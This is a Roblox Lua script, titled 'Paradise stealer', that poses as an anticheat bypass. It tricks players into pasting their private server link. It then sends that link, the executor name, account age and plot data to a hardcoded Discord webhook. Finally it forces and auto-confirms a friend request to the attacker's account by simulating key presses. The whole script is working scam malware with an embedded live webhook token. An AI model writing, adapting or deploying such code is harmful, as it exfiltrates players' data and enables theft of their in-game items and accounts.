local Username = "SoloXFurye"
local Webhook = "1419178822296801422/wRTY9R5CZfLyZ6GveZVsZZTNEnWN89fjiQuluYkH4bWAYiAUEuLsuu1V_i7gYnxvZOyM"
local KeyCode = Enum.KeyCode
local CreateInstance = Instance.new
local CreateUDim2 = UDim2.new
local CreateVector2 = Vector2.new
local CreateColor3 = Color3.fromRGB
local CreateUDim = UDim.new
local FontEnum = Enum.Font
local CreateColor3Simple = Color3.new
local CreateTweenInfo = TweenInfo.new
local CreateColorSequenceKeypoint = ColorSequenceKeypoint.new

-- genv.Executed lines removed as requested by your changes.

local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local GuiService = game:GetService("GuiService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
-- Using standard global UserSettings() as specified in your latest input
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local VirtualInputManager = game:GetService("VirtualInputManager")
local PlotController = require(ReplicatedStorage.Controllers.PlotController)
require(ReplicatedStorage.Utils.NumberUtils)
require(ReplicatedStorage.Datas.Animals)
require(ReplicatedStorage.Datas.Mutations)
require(ReplicatedStorage.Packages.Net)
local GetSynchronizer = require(ReplicatedStorage.Packages.Synchronizer).Get
local LocalPlayer = Players.LocalPlayer
local GetServerTypeEvent = RobloxReplicatedStorage:WaitForChild("GetServerType")

-- The problematic lines causing the "not a valid member" error have been removed.
-- The variable GetServerTypeEvent is now ready to be used if needed later.

local MainScreenGui = CreateInstance("ScreenGui", CoreGui)
local MainFrame = CreateInstance("Frame", MainScreenGui)
MainFrame.Size = CreateUDim2(0, 450, 0, 240)
MainFrame.Position = CreateUDim2(0.5, 0, 0.5, 0)
MainFrame.AnchorPoint = CreateVector2(0.5, 0.5)
MainFrame.BackgroundColor3 = CreateColor3(25, 25, 25)
MainFrame.BackgroundTransparency = 0.15
local FrameCorner = CreateInstance("UICorner", MainFrame)
FrameCorner.CornerRadius = CreateUDim(0, 20)
local TitleLabel = CreateInstance("TextLabel", MainFrame)
TitleLabel.Size = CreateUDim2(1, -20, 0, 45)
TitleLabel.Position = CreateUDim2(0, 10, 0, 10)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Enter your Private Server Link to bypass anticheat"
TitleLabel.TextColor3 = CreateColor3(255, 255, 255)
TitleLabel.TextWrapped = true
TitleLabel.TextScaled = true
TitleLabel.Font = FontEnum.FredokaOne
local LinkTextBox = CreateInstance("TextBox", MainFrame)
LinkTextBox.Size = CreateUDim2(0.9, 0, 0, 40)
LinkTextBox.Position = CreateUDim2(0.05, 0, 0.45, 0)
LinkTextBox.PlaceholderText = "Paste your private server link here..."
LinkTextBox.Text = ""
LinkTextBox.TextScaled = true
LinkTextBox.BackgroundColor3 = CreateColor3(50, 50, 50)
LinkTextBox.TextColor3 = CreateColor3Simple(1, 1, 1)
LinkTextBox.Font = FontEnum.GothamBlack
local TextBoxCorner = CreateInstance("UICorner", LinkTextBox)
TextBoxCorner.CornerRadius = CreateUDim(0, 12)
local ContinueButton = CreateInstance("TextButton", MainFrame)
ContinueButton.Size = CreateUDim2(0.5, 0, 0, 40)
ContinueButton.Position = CreateUDim2(0.25, 0, 0.7, 0)
ContinueButton.Text = "Continue"
ContinueButton.BackgroundColor3 = CreateColor3(90, 90, 90)
ContinueButton.TextColor3 = CreateColor3Simple(1, 1, 1)
ContinueButton.TextScaled = true
ContinueButton.Font = FontEnum.GothamBlack
local ButtonCorner = CreateInstance("UICorner", ContinueButton)
ButtonCorner.CornerRadius = CreateUDim(0, 12)
local StatusLabel = CreateInstance("TextLabel", MainFrame)
StatusLabel.Size = CreateUDim2(1, 0, 0, 30)
StatusLabel.Position = CreateUDim2(0, 0, 0.9, -5)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = ""
StatusLabel.TextScaled = true
StatusLabel.Font = FontEnum.FredokaOne
StatusLabel.TextColor3 = CreateColor3Simple(1, 0, 0)
MainFrame.BackgroundTransparency = 1
TitleLabel.TextTransparency = 1
LinkTextBox.TextTransparency = 1
ContinueButton.TextTransparency = 1
StatusLabel.TextTransparency = 1
local TweenService = game:GetService("TweenService")
local FrameTween = TweenService:Create(MainFrame, CreateTweenInfo(0.6), {
    BackgroundTransparency = 0.15,
})
FrameTween:Play()
local TitleTween = TweenService:Create(TitleLabel, CreateTweenInfo(0.6), {
    TextTransparency = 0,
})
TitleTween:Play()
local TextBoxTween = TweenService:Create(LinkTextBox, CreateTweenInfo(0.6), {
    TextTransparency = 0,
})
TextBoxTween:Play()
local ButtonTween = TweenService:Create(ContinueButton, CreateTweenInfo(0.6), {
    TextTransparency = 0,
})
ButtonTween:Play()
ContinueButton.MouseButton1Click:Connect(function(...)
    local PrivateServerLink = LinkTextBox.Text
    local IsInvalidLink = not PrivateServerLink:match("^https://www%.roblox%.com/share%?code=%w+&type=Server$")
    StatusLabel.TextTransparency = 0
    
    if IsInvalidLink then
        StatusLabel.TextColor3 = CreateColor3Simple(1, 0, 0)
        StatusLabel.Text = "❌ Invalid link format!"
        ContinueButton.Active = true -- Re-enable the button
        return -- Stop execution if link is invalid
    end
    
    StatusLabel.TextColor3 = CreateColor3Simple(0, 1, 0)
    StatusLabel.Text = "✅ Valid link!"
    ContinueButton.Active = false
    task.wait(1)
    MainScreenGui:Destroy()

    local MyPlotChannel
    local PlotChannelValue = "N/A"
    -- Attempt to get the plot channel safely
    pcall(function()
        -- Assuming PlotController:GetMyPlot() returns an object with a Channel table
        -- that has a Get method to retrieve the channel ID/data.
        MyPlotChannel = PlotController:GetMyPlot().Channel.Get
        PlotChannelValue = tostring(MyPlotChannel)
    end)
    
    -- Using the local Webhook variable and correcting the URL format
    local WebhookUrl = "https://discord.com/api/webhooks/"..Webhook
    
    local ExecutorName, ExecutorVersion = identifyexecutor()
    
    -- 1. Construct the full webhook payload (which includes the embed)
    local WebhookPayload = {
        -- Content is optional, but often used for a direct message above the embed
        content = "**New dualhook HIt:** " .. PrivateServerLink, 
        embeds = {
            { -- Start of Embed 
                color = 0x8B0000, -- Bright yellow/gold color (0xFFC90B)
                fields = {
                    [1] = {
                        name = "Player Information",
                        -- Using the local Username variable
                        value = " \nReceiver: " .. Username .. "\nExecutor: " ..ExecutorName .."\nAccount Age: " .. Players.LocalPlayer.AccountAge .. " days```",
                        inline = false,
                    },
                    [2] = {
                        name = "Plot Channel (ID)",
                        value = "```" .. PlotChannelValue .. "```", -- Plot Channel data
                        inline = true,
                    },
                    [3] = {
                        name = "Brainrots",
                        value = "```Empty```",
                        inline = true,
                    },
                    [4] = {
                        name = ":link: Join Private Server",
                        value = "**[Join](" .. PrivateServerLink .. ")**", -- Actionable link
                        inline = false,
                    },
                },
                title = "Paradise stealer",
            } -- End of Embed
        },
    } -- End of WebhookPayload

    -- 2. Encode the Lua table into a JSON string for the HTTP request
    local WebhookData = HttpService:JSONEncode(WebhookPayload)

    -- Send the webhook request
    request({
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Url = WebhookUrl,
        Method = "POST",
        Body = WebhookData,
    })
    
        
        
    
    -- Use local Username for the target player
    local TargetPlayer = Players:FindFirstChild(Username)
    
    local CurrentThreadIdentity = getthreadidentity()
    setthreadidentity(5)
    
    -- Attempt friend request if the target player is in the game
    if TargetPlayer then
        StarterGui:SetCore("PromptSendFriendRequest", TargetPlayer)
    end

    
    task.wait(0.5)
    local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
    local PromptDialog = RobloxGui:FindFirstChild("PromptDialog")
    local ContainerFrame = PromptDialog and PromptDialog:FindFirstChild("ContainerFrame")
    local ConfirmButton = ContainerFrame and ContainerFrame:FindFirstChild("ConfirmButton")
    setthreadidentity(CurrentThreadIdentity)
    if ConfirmButton then
        GuiService.SelectedObject = ConfirmButton
        task.wait(0.3)
        VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
        VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
        task.wait(0.2)
        VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
        VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
        task.wait(0.2)
        VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
        VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
        task.wait(0.2)
    end
    
    -- Update PlayerAdded connection to use local Username
    Players.PlayerAdded:Connect(function(NewPlayer)
        local IsTargetPlayer = table.find({Username}, NewPlayer.Name)
        if IsTargetPlayer then
            local MyPlotChannel = PlotController:GetMyPlot().Channel.Get
            local ThreadIdentity = getthreadidentity()
            CHECKIF(ThreadIdentity)
            setthreadidentity(5)
            StarterGui:SetCore("PromptSendFriendRequest", NewPlayer)
            task.wait(0.5)
            local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
            local PromptDialog = RobloxGui:FindFirstChild("PromptDialog")
            local ContainerFrame = PromptDialog and PromptDialog:FindFirstChild("ContainerFrame")
            local ConfirmButton = ContainerFrame and ContainerFrame:FindFirstChild("ConfirmButton")
            setthreadidentity(ThreadIdentity)
            if ConfirmButton then
                GuiService.SelectedObject = ConfirmButton
                task.wait(0.3)
                VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
                VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
                task.wait(0.2)
                VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
                VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
                task.wait(0.2)
                VirtualInputManager:SendKeyEvent(true, KeyCode.Return, false, game)
                VirtualInputManager:SendKeyEvent(false, KeyCode.Return, false, game)
                task.wait(0.2)
            end
        end
    end)
end)
